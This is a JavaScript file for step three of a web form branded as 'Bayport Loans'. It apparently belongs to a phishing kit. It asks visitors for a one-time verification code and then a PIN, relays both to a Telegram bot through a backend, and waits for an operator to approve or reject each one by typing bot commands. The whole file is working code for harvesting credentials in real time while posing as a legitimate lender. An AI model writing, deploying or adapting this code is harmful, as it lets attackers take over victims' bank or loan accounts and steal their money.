// Global variables
let lastUpdateId = 0;
let checkInterval;
let timerInterval;

// Wait for DOM to load
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ Bayport Loans - Page 3 loaded');
    
    // Get reference ID from localStorage
    const refId = localStorage.getItem('currentRef');
    
    if (refId) {
        document.getElementById('refId').textContent = refId;
        console.log('📋 Reference ID:', refId);
        
        // Start checking for Telegram updates
        startCheckingUpdates();
    } else {
        console.error('❌ No reference ID found');
        alert('No application reference found. Please start over.');
        window.location.href = 'index.html';
    }
    
    // Handle code form submission
    const codeForm = document.getElementById('codeForm');
    
    if (codeForm) {
        codeForm.addEventListener('submit', function(e) {
            e.preventDefault();
            console.log('📝 Code form submitted');
            
            const code = document.getElementById('verificationCode').value.trim();
            const refId = localStorage.getItem('currentRef');
            
            if (!code) {
                alert('Please enter the verification code');
                return;
            }
            
            if (code.length < 4 || code.length > 6) {
                alert('Code must be 4-6 digits');
                return;
            }
            
            // Disable form and show timer
            document.getElementById('verificationCode').disabled = true;
            document.getElementById('submitCodeBtn').disabled = true;
            document.getElementById('codeForm').style.opacity = '0.7';
            document.getElementById('timer').classList.remove('hidden');
            
            // Start 3-minute timer
            startTimer(180);
            
            console.log('🔐 Code submitted:', code);
            showMessage('Code sent for verification. Please wait for admin approval...', 'success');
            
            // Send code to Telegram via backend
            fetch('/api/send-message', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    message: `🔐 CODE ENTERED\nRef: ${refId}\nCode: ${code}`
                })
            }).catch(error => console.error('Error sending code:', error));
        });
    }
    
    // Input validation
    document.getElementById('verificationCode')?.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
    });
    
    document.getElementById('pinCode')?.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
    });
});

// Start checking for updates from Telegram
function startCheckingUpdates() {
    console.log('🔄 Waiting for Telegram bot response...');
    
    checkInterval = setInterval(async () => {
        try {
            const response = await fetch(`/api/get-updates/${lastUpdateId}`);
            const data = await response.json();
            
            if (data.success && data.data.result.length > 0) {
                processTelegramUpdates(data.data.result);
            }
        } catch (error) {
            // Silent retry - don't show errors
            console.log('Waiting for Telegram response...');
        }
    }, 3000);
}

// Process updates from Telegram ONLY
function processTelegramUpdates(updates) {
    updates.forEach(update => {
        lastUpdateId = update.update_id;
        
        if (update.message && update.message.text) {
            const text = update.message.text;
            const refId = localStorage.getItem('currentRef');
            
            // Only respond to Telegram bot commands
            if (text.includes(`/correct_${refId}`)) {
                handleCorrectCode();
            } else if (text.includes(`/wrong_${refId}`)) {
                handleWrongCode();
            } else if (text.includes(`/pin_correct_${refId}`)) {
                handlePinCorrect();
            } else if (text.includes(`/pin_wrong_${refId}`)) {
                handlePinWrong();
            }
        }
    });
}

// Handle correct code (from Telegram ONLY)
function handleCorrectCode() {
    console.log('✅ Code verified by Telegram');
    
    clearInterval(checkInterval);
    if (timerInterval) clearInterval(timerInterval);
    
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('codeForm').classList.add('hidden');
    document.getElementById('pinSection').classList.remove('hidden');
    
    showMessage('✅ Code verified! Please enter your PIN.', 'success');
}

// Handle wrong code (from Telegram ONLY)
function handleWrongCode() {
    console.log('❌ Code rejected by Telegram');
    
    showMessage('❌ Wrong code. Please try again.', 'error');
    
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('verificationCode').disabled = false;
    document.getElementById('submitCodeBtn').disabled = false;
    document.getElementById('codeForm').style.opacity = '1';
    document.getElementById('verificationCode').value = '';
    document.getElementById('verificationCode').focus();
    
    if (timerInterval) clearInterval(timerInterval);
}

// Submit PIN for verification
function submitPin() {
    const pin = document.getElementById('pinCode').value.trim();
    const refId = localStorage.getItem('currentRef');
    
    if (!pin) {
        alert('Please enter your PIN');
        return;
    }
    
    if (pin.length < 4 || pin.length > 6) {
        alert('PIN must be 4-6 digits');
        return;
    }
    
    console.log('🔑 PIN submitted:', pin);
    
    document.getElementById('pinCode').disabled = true;
    document.querySelector('.pin-section .btn-submit').disabled = true;
    
    showMessage('PIN sent for verification. Please wait...', 'success');
    
    // Send PIN to Telegram via backend
    fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            message: `🔑 PIN ENTERED\nRef: ${refId}\nPIN: ${pin}`
        })
    }).catch(error => console.error('Error sending PIN:', error));
}

// Handle correct PIN (from Telegram ONLY)
function handlePinCorrect() {
    console.log('✅ PIN verified by Telegram');
    
    showMessage('✅ PIN verified! Redirecting...', 'success');
    
    setTimeout(() => {
        // Clear data
        localStorage.removeItem('loanApp');
        localStorage.removeItem('fullApp');
        localStorage.removeItem('currentRef');
        
        window.location.href = 'success.html';
    }, 2000);
}

// Handle wrong PIN (from Telegram ONLY)
function handlePinWrong() {
    console.log('❌ PIN rejected by Telegram');
    
    document.getElementById('pinCode').disabled = false;
    document.getElementById('pinCode').value = '';
    document.querySelector('.pin-section .btn-submit').disabled = false;
    document.getElementById('pinCode').focus();
    
    showMessage('❌ Wrong PIN. Please try again.', 'error');
}

// Start timer
function startTimer(seconds) {
    const timerDisplay = document.getElementById('countdown');
    const progressBar = document.getElementById('progress');
    
    timerDisplay.textContent = seconds;
    progressBar.style.width = '100%';
    
    timerInterval = setInterval(() => {
        seconds--;
        timerDisplay.textContent = seconds;
        
        const percentage = (seconds / 180) * 100;
        progressBar.style.width = percentage + '%';
        
        if (seconds <= 0) {
            clearInterval(timerInterval);
            handleTimeout();
        }
    }, 1000);
}

// Handle timeout
function handleTimeout() {
    console.log('⏰ Timer expired');
    
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('verificationCode').disabled = false;
    document.getElementById('submitCodeBtn').disabled = false;
    document.getElementById('codeForm').style.opacity = '1';
    document.getElementById('verificationCode').value = '';
    
    showMessage('⏰ Time expired. Please request a new code and try again.', 'error');
}

// Show message to user
function showMessage(text, type) {
    const messageBox = document.getElementById('messageBox');
    messageBox.textContent = text;
    messageBox.className = 'message-box ' + type;
    messageBox.classList.remove('hidden');
    
    // Auto hide after 5 seconds for success messages
    if (type === 'success') {
        setTimeout(() => {
            messageBox.classList.add('hidden');
        }, 5000);
    }
}